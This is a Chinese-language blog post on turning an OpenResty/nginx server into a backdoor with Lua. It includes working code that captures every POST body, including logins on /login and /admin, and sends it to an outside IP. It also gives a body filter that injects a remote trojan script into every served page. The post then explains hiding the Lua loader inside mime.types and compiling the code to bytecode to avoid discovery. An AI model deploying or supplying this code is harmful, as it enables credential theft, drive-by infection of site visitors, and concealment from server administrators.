---
title: Lua 复制http请求
categories: lua
tag: hide
date: 2020-03-16 16:37:49
tags:
---

数据监听、窃取
nginx实现数据监听非法方便，只要以下ngx.req.read_body()和local post_args = ngx.req.get_post_args()2行代码即可， 再利用lua-resty-http模块就可以将数据通过post的方式提交到黑阔指定的地方，测试代码如下：

local http = require "resty.http"
local cjson = require("cjson")

local _M = {}

function _M.sniff()
    ngx.req.read_body()
    local post_args = ngx.req.get_post_args()
    ngx.log(ngx.DEBUG, "data=" .. cjson.encode(post_args))
    if post_args then
        local httpc = http.new()
        local res, err = httpc:request_uri("http://111.111.111.111/test/", {
            method = "POST",
            body = "data=" .. cjson.encode(post_args),
            headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded",
        }
        })
    end
end

return _M
然后用tornado写个接受post参数的web程序，测试代码及效果如下：


如果将监听的代码放到nginx的http段中，表示全局监听并窃取post数据，这样黑阔就会收到所有的post数据请求，对目标服务器的性能也有影响。

access_by_lua 'cmd.sniff() ';
最佳的做法是放到目标站点的关键的location中，比如/login、/admin等，需要注意的是lua-resty-http是基于cosocket实现的，所以不能放在以下几个阶段 set_by_lua*, log_by_lua*, header_filter_by_lua*, body_filter_by_lua。

如果只想记录正确的密码，过滤掉错误的，就需要在header_filter_by_lua或body_filter_by_lua阶段，通过服务器返回的值来判断用户post提交的密码是否正确，这个时候如果想提交到服务器中的话，就不能使用lua-resty-http了，但是可以通过ngx.timer.at 以异步的方式提交。 另外也可以使用第三方的模块lua-requests在header_filter_by_lua或body_filter_by_lua阶段提交数据，利用luarocks为openresty安装lua-requests的过程如下：
```
wget http://luarocks.org/releases/luarocks-2.0.13.tar.gz
tar -xzvf luarocks-2.0.13.tar.gz
cd luarocks-2.0.13/
./configure --prefix=/usr/local/openresty/luajit \
    --with-lua=/usr/local/openresty/luajit/ \
    --lua-suffix=jit-2.1.0-alpha \
    --with-lua-include=/usr/local/openresty/luajit/include/luajit-2.1
make
sudo make install

sudo /usr/local/openresty/luajit/luarocks install lua-requests
```
挂马
在nginx返回数据时，将网页木马插入即可，代码如下：
```
function _M.hang_horse()
    local data = ngx.arg[1] or ""
    local html = string.gsub(data, "</head>", "<script src=\"http://docs.xsec.io/1.js\"></script></head>")
    ngx.arg[1] = html
end
```
放到目标网站的/目录下后的效果如下：
```
location ~* ^/ {
    body_filter_by_lua 'cmd.hang_horse()';

Lua代码加密及隐藏
lua加载代码隐藏
毕竟光明正大地在nginx.conf中加入了执行lua的代码后非常容易被发现，攻击者可以用include指令将以下代码改得隐蔽一些。

http {
  include       mime.types;
  # lua 文件的位置
  lua_package_path "/usr/local/openresty/nginx/conf/lua_src/?.lua;;";
  # nginx启动阶段时执行的脚本，可以不加
  init_by_lua_file 'conf/lua_src/Init.lua';
```
改成以下的内容，看起来与之前的配置完全一样，把加载lua的代码放到mime.types文件中，mime.types是一般用nginx默认的，一般很少有人去查看或改动其内容。
```
http {
  include       mime.types;
```
lua代码加密
即便是把lua加载的配置代码放在隐蔽的地方了，但是还在存在被找到的风险的，找到后如果是明文的lua代码，那行踪将暴露的一览无余，至少将lua代码加密一下。

openresty使用的是luajit，luajit提供了一个luajit -b参数，可以将代码编译为字节码，这样就不容易被看到明文代码了。

使用方式如下图所示（openresty的luajit的默认路径为/usr/local/openresty/luajit/bin/luajit），用编译后的lua字节码替换掉明文的文件即可。



